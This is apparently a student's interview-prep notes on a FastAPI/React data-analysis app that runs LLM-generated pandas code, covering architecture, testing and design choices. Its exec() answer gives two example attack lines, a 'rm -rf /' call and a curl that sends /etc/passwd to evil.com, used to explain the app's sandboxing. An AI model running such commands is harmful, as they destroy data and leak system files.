# 🎯 Infosys Interview Prep — Part 4: Frontend, Testing & Tricky Questions

---

## Q26. Explain React concepts used in your project.

**Answer:**

### Components (13 pages + 11 components)
Each page is a **functional component**. I use `useState` for local state, `useEffect` for side effects (API calls on mount).

### React Router (v7)
Defines routes: `/login`, `/dashboard`, `/query`, etc. `ProtectedRoute` component wraps pages that need authentication — checks if token exists, redirects to `/login` if not.

### Context API (AuthContext + DashboardContext)
- **AuthContext**: Stores user info, tokens, login/logout functions. Accessible anywhere via `useContext(AuthContext)`.
- **DashboardContext**: Stores pinned dashboard items.
- Why Context instead of Redux? My app has simple state needs — Context is lighter and built-in.

### Error Boundary
A class component that catches JavaScript errors in child components. Instead of crashing the entire page (white screen), it shows a friendly error message with a "Try Again" button. Uses `componentDidCatch()` lifecycle.

### Custom Hooks
- `useAuth()` — wraps AuthContext for cleaner access
- `useDashboard()` — wraps DashboardContext

### Axios Interceptors
- Request interceptor → attaches JWT
- Response interceptor → handles 401 → auto-refresh token

---

## Q27. How does the ChartRenderer component work?

**Answer:**
`ChartRenderer.jsx` is a **unified chart component** that takes chart config and renders the appropriate Recharts component:

```
Input: { chart_type, data, x_axis, y_axis }
```

Based on `chart_type`, it renders:
- `bar` → `<BarChart>` with `<Bar>` elements
- `line` → `<LineChart>` with `<Line>` elements
- `pie` → `<PieChart>` with `<Pie>` and custom labels
- `scatter` → `<ScatterChart>` with `<Scatter>`
- `histogram` → `<BarChart>` with binned data
- `heatmap` → Custom grid with color-coded cells
- `table` → HTML `<table>` with formatted data

All charts include: tooltips, legends, responsive containers, axis labels, and animations.

---

## Q28. How do you handle errors in your application?

**Answer:**

### Frontend:
1. **Error Boundary** — catches render errors, shows fallback UI
2. **Try-catch in API calls** — every API call is wrapped, shows user-friendly toast/alert
3. **Axios interceptor** — catches 401s globally, attempts token refresh
4. **Form validation** — validates input before submission (Pydantic validators on backend mirror this)

### Backend:
1. **HTTPException** — FastAPI's built-in exception with status code + detail message
2. **Validation errors** — Pydantic automatically returns 422 with field-level errors
3. **Graceful LLM fallback** — if Gemini fails, stub engine takes over (no user-facing error)
4. **Non-fatal persistence** — if DB save fails (e.g., during dataset upload), the in-memory store still works
5. **Execution timeout** — 10-second limit prevents infinite loops from crashing the server
6. **File validation** — checks format, size, readability before processing

---

## Q29. How did you test your application?

**Answer:**
I use **pytest** for backend unit tests covering:
- **Query Validator**: Tests that safe code passes and dangerous code is blocked
- **Query Executor**: Tests execution on sample DataFrames, timeout handling, security violations
- **Schema Extractor**: Tests column type detection and summary generation
- **Forecaster**: Tests linear regression and moving average with known data
- **Auth endpoints**: Tests register, login, duplicate user, invalid credentials
- **Voice API**: Tests STT/TTS with mock audio
- **Insight Generator**: Tests highlight generation with different data shapes

Run with: `cd backend && pytest tests/ -v`

---

## Q30. What challenges did you face and how did you solve them?

**Answer:**

### Challenge 1: LLM generating unsafe code
**Problem:** The LLM sometimes generated code with `import os` or `exec()` calls.
**Solution:** Implemented 4-layer security: regex patterns → syntax check → AST walking → restricted namespace.

### Challenge 2: Cross-dataset context leaking
**Problem:** If a user queried "sales.csv" then switched to "employees.csv", the LLM would reference sales columns.
**Solution:** Scoped the context manager by `(session_id, dataset_id)` — changing datasets starts fresh context.

### Challenge 3: Datasets lost on server restart
**Problem:** Datasets were stored only in-memory. Server restart = all datasets gone.
**Solution:** Added `DatasetRecord` table in DB + `restore_datasets_from_db()` on startup that reloads from Neon.

### Challenge 4: Token expiry interrupting user workflow
**Problem:** Users got logged out mid-analysis when the access token expired.
**Solution:** Implemented Axios response interceptor that catches 401 → calls `/api/auth/refresh` → retries request.

### Challenge 5: Gemini API quota exhaustion
**Problem:** Free tier has limited requests/day. After quota, all queries fail.
**Solution:** Built keyword-based stub engine as automatic fallback. Detects "429 RESOURCE_EXHAUSTED" and switches seamlessly.

---

## Q31. What are the limitations of your project?

**Answer:**
1. **File size limit**: 50MB max — very large datasets would need chunking/streaming
2. **No real-time collaboration**: Single-user per session
3. **Stub engine is limited**: Keyword matching can't handle complex queries like Gemini can
4. **No scheduled report delivery**: The DB model exists but email sending isn't fully implemented
5. **In-memory dataset store**: All datasets must fit in server RAM — not suitable for TB-scale data
6. **No fine-tuned model**: Uses general Gemini — could be improved with domain-specific fine-tuning

---

## Q32. If you had more time, what would you add?

**Answer:**
1. **Role-based access control (RBAC)**: Admin, Analyst, Viewer roles
2. **Collaborative dashboards**: Multiple users editing the same dashboard
3. **Dataset versioning**: Track changes to cleaned datasets
4. **Webhook-based alerts**: Trigger Slack/email notifications when alert conditions are met
5. **Fine-tuned LLM**: Train on domain-specific queries for higher accuracy
6. **Caching layer**: Redis to cache frequent queries
7. **CI/CD pipeline**: GitHub Actions for automated testing + deployment

---

## Q33. What is the difference between FastAPI and Flask/Django?

**Answer:**

| Feature | FastAPI | Flask | Django |
|---------|---------|-------|--------|
| Speed | Fastest (async, Starlette) | Moderate | Moderate |
| Type hints | Built-in (Pydantic) | Manual | Manual |
| Auto docs | Yes (Swagger + ReDoc) | No (need extension) | No |
| Async | Native `async/await` | Limited | Limited |
| Validation | Automatic (Pydantic) | Manual | Forms/DRF |
| Learning curve | Medium | Easy | Steep |
| Best for | APIs, microservices | Small apps | Full MVC apps |

I chose FastAPI because I needed: fast API performance, automatic request validation, and auto-generated Swagger docs for frontend integration.

---

## Q34. What is Pydantic and how do you use it?

**Answer:**
Pydantic is a Python library for **data validation using type hints**. In my project:

```python
class QueryRequest(BaseModel):
    dataset_id: str           # Required string
    query: str                # Required string
    graph_type: Optional[str] = "auto"  # Optional with default
    z_threshold: Optional[float] = 3.0
```

When a POST request comes to `/api/queries/ask`, FastAPI automatically:
1. Parses the JSON body
2. Validates types (if `dataset_id` is missing → 422 error)
3. Applies defaults (if `graph_type` not sent → "auto")
4. Creates a `QueryRequest` object

I also use `pydantic-settings` for configuration:
```python
class Settings(BaseSettings):
    DATABASE_URL: str = "sqlite:///./database.db"
    class Config:
        env_file = "../.env"
```
This auto-reads from `.env` file and environment variables.

---

## Q35. How does dataset ownership work?

**Answer:**
Every dataset is tagged with `user_id` at upload time. When any API endpoint accesses a dataset:

```python
def _get_user_dataset(dataset_id, user_id):
    dataset = datasets[dataset_id]
    if dataset["user_id"] != user_id:
        raise HTTPException(status_code=403, detail="Not authorised")
    return dataset
```

This means:
- User A cannot query User B's datasets
- User A cannot see User B's datasets in the list
- User A cannot delete User B's datasets
- The JWT token identifies who the user is, and every operation checks ownership

---

## Q36. What is the difference between `exec()` and `eval()` and why is `exec()` dangerous?

**Answer:**
- `eval()` evaluates a **single expression** and returns its value: `eval("2+3")` → `5`
- `exec()` executes **arbitrary Python statements**: can define functions, import modules, delete files

**Why dangerous?** If a user controls what goes into `exec()`, they can:
```python
exec("import os; os.system('rm -rf /')")  # Delete everything
exec("import subprocess; subprocess.call(['curl', 'evil.com', '-d', open('/etc/passwd').read()])")
```

**My mitigation:** I use exec() but with:
1. `{"__builtins__": {}}` — removes all built-in functions
2. Only `df` (copy) and `pd` available in namespace
3. AST walker rejects any dangerous patterns BEFORE exec runs
4. Regex validator as first line of defence
5. 10-second timeout

---

## Q37. What HTTP methods do your APIs use and why?

| Method | Endpoint | Why |
|--------|----------|-----|
| POST | `/api/auth/register` | Creating a new resource (user) |
| POST | `/api/auth/login` | Creating a new resource (session/token) |
| POST | `/api/datasets/upload` | Creating a new resource (dataset) |
| GET | `/api/datasets/list` | Reading/listing resources |
| GET | `/api/datasets/{id}/schema` | Reading a specific resource |
| DELETE | `/api/datasets/{id}` | Soft-deleting a resource |
| POST | `/api/queries/ask` | Creating a new query execution |
| GET | `/api/queries/history` | Reading past queries |
| POST | `/api/voice/transcribe` | Processing (creating transcript from audio) |

POST for state changes, GET for reads, DELETE for removals — follows **REST conventions**.

---

## Q38. What is the difference between SQL and NoSQL? Why did you choose SQL?

**Answer:**
- **SQL (PostgreSQL)**: Structured, table-based, ACID compliant, relational (foreign keys), schema-enforced
- **NoSQL (MongoDB)**: Flexible schema, document-based, eventual consistency, horizontal scaling

**I chose SQL because:**
1. My data is **relational**: Users → QueryLogs (foreign key), Users → Datasets (foreign key)
2. I need **ACID transactions**: When saving a query log, I need guaranteed consistency
3. **Schema enforcement**: Username must be unique, email must be unique — SQL enforces this at DB level
4. SQLAlchemy ORM works beautifully with SQL databases
5. PostgreSQL handles my scale (thousands of rows, not millions) perfectly

---

## Q39. Quick-fire: What does each Python library do?

| Library | Purpose |
|---------|---------|
| `fastapi` | Web framework for building APIs |
| `uvicorn` | ASGI server that runs FastAPI |
| `sqlalchemy` | ORM for database operations |
| `psycopg2-binary` | PostgreSQL driver for Python |
| `python-jose` | JWT token encoding/decoding |
| `bcrypt` | Password hashing |
| `pandas` | Data manipulation and analysis |
| `numpy` | Numerical computing (used in forecasting) |
| `google-genai` | Google Gemini AI SDK |
| `gTTS` | Text-to-speech (Google free) |
| `pydantic` | Data validation via type hints |
| `pydantic-settings` | Configuration from .env files |
| `python-multipart` | File upload support in FastAPI |
| `openpyxl` | Excel file reading/writing |

---

## Q40. What would happen if two users upload files at the same time?

**Answer:**
I handle this with a **thread-safe counter**:
```python
_counter_lock = threading.Lock()

with _counter_lock:
    _dataset_counter += 1
    dataset_id = str(_dataset_counter)
```

Without the lock, two concurrent uploads could get the same `_dataset_counter` value (race condition), overwriting each other's dataset. The `threading.Lock()` ensures only one thread increments at a time.

Each file is also saved with a unique name: `user{id}_{uuid}_{original_name}` to prevent filename collisions on disk.
